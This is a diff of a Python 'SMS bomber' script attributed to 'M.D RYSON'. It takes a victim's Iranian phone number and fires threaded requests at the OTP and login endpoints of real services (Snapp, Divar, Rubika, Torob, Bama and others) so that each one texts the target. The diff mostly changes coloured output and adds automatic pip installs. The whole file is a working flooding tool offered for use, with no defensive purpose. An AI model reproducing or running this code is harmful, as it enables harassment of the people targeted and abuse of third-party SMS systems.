@@ -1,19 +1,50 @@
-import os
+
+# imports ------
+from os import system
+# try !
+try:
+    import requests
+except:
+    system ('pip install requests')
+try:
+    import threading
+except:
+    system ('pip install threading')
+try:
+    import colored
+except:
+    system ('pip install colored')
+# !
 import time
 import requests
 import sys
 from threading import Thread
-from colorama import Fore
 from time import sleep
 from colored import fg, bg, attr
+#-----
+# proxy ----
 proxy = {"https": "127.0.0.1.8000"}
-os.system("clear")
-print(Fore.RED)
-print(""" sMs bOmBeR God """)
-sleep(2)
+#--------
+try:
+    system('clear')
+except:
+    system('cls')
+
+green="\033[32m"
+red ="\033[31m"
+blue="\033[36m"
+pink="\033[35m"
 yellow="\033[93m"
-print(Fore.GREEN)
-s = f"""
+darkblue="\033[34m"
+white="\033[00m"
+
+print(f"{blue}\n\n\n\n\nsMs bOmBeR God\n")
+sleep(2)
+
+tm = ''
+
+
+s = f"""{pink}
 ▄▄▄▄▄▄   ▄▄▄    ▄▄▄   ▄▄▄▄      ▄▄▄▄    ▄▄▄   ▄▄
  ██▀▀▀▀██  ██▄  ▄██  ▄█▀▀▀▀█    ██▀▀██   ███   ██                                        ██    ██   ██▄▄██   ██▄       ██    ██  ██▀█  ██
  ███████     ▀██▀     ▀████▄   ██    ██  ██ ██ ██
@@ -22,9 +53,9 @@ s = f"""
  ▀▀    ▀▀▀    ▀▀      ▀▀▀▀▀      ▀▀▀▀    ▀▀   ▀▀▀
 
 
-T.me/Creator_ryson | T.Me/Uupdatte
-rubika.ir/Caetorr  | creator-rayson.blogfa.com
-{yellow}SMS SENDER [M.D RYSON]
+|t.me/creator_ryson|t.me/uupdatte            |
+|rubika.ir/caetorr |creator-rayson.blogfa.com|\n\n
+{yellow}<SMS SENDER> ~ [M.D RYSON]
 """
 for t in s:
     sys.stdout.write(t)
@@ -39,11 +70,11 @@ def snap(phone):
     try:
         snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
         if "OK" in snapR.text:
-            print (Fore.GREEN+"[+]snap SEND")
+            print (F"{blue}[+]snap SEND")
         else:
-            print (Fore.GREEN+"[+]snap SEND")
+            print (F"{red}[!]not FOUND")
     except:
-        print ("not send")
+        print (f"{red}not send")
 
 def shad(phone):
     #shad api
@@ -52,11 +83,11 @@ def shad(phone):
     try:
         shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
         if "OK" in shadR.text:
-            print (Fore.Green+"shad Send")
+            print (F"{green}shad Send")
         else:
-            print ("not the found")
+            print (f"{red}not the found")
     except:
-        print ("is not attack")
+        print (f"{red}is not attack")
 
 def gap(phone):
     #gap api
@@ -66,9 +97,9 @@ def gap(phone):
         if "OK" in gapR.text:
             print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!")
+            print (f"{red}not found target-!")
     except:
-        print ("no attack-!")
+        print (f"{red}no attack-!")
 
 def tap30(phone):
     #tap30 api
@@ -77,11 +108,11 @@ def tap30(phone):
     try:
         tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
         if "OK" in tap30R.text:
-            print ("!-attacked-!\n")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!\n")
+            print (f"{red}not found target-!\n")
     except:
-            print ("no attack-!\n")
+            print (f"{red}no attack-!\n")
 
 def emtiaz(phone):
     #emtiaz api
@@ -89,9 +120,9 @@ def emtiaz(phone):
     emD = "send=1&cellphone=0"+phone.split("+98")[1]
     try:
         emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD)
-        print ("!-attacked-!\n")
+        print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
     except:
-        print ("no attack-!\n")
+        print (f"{red}no attack-!\n")
 
 def divar(phone):
     #divar api
@@ -100,11 +131,11 @@ def divar(phone):
     try:
         divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
         if "SENT" in divarR.text:
-            print ("!-attacked-!\n")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!")
+            print (f"{red}not found target-!")
     except:
-        print ("no attack-!")
+        print (f"{red}no attack-!")
 
 def rubika(phone):
     #rubika api
@@ -113,11 +144,11 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
         if "OK" in ruR.text:
-            print ("!-attacked-!\n")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!")
+            print (f"{red}not found target-!\n")
     except:
-        print ("no attack-!")
+        print (f"{red}no attack-!\n")
 
 def torob(phone):
     #torob api
@@ -125,11 +156,11 @@ def torob(phone):
     try:
         torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
         if "sent" in torobR.text:
-            print ("!-attacked-!\n")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!")
+            print (f"{red}not found target-!\n")
     except:
-        print ("no attack-!")
+        print (f"{red}no attack-!\n")
 
 def bama(phone):
     #bama api
@@ -138,11 +169,11 @@ def bama(phone):
     try:
         bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
         if "0" in bamaR.text:
-            print ("!-attacked-!\n")
+            print ("\n%s%s!-attacked-!%s" % (fg('green'), bg('white'), attr('reset')))
         else:
-            print ("not found target-!")
+            print (f"{red}not found target-!\n")
     except:
-        print ("no attack-!")
+        print (f"{red}no attack-!\n")
 
 try:
     phone = str(input(" Number Target (+98xxxxxxx)> "))
@@ -156,9 +187,9 @@ try:
         Thread(target=rubika, args=[phone]).start()
         Thread(target=torob, args=[phone]).start()
         Thread(target=bama, args=[phone]).start()
-        #os.system("killall -HUP tor")
+        
         
 
 
 except:
-        print("not")
+        print()
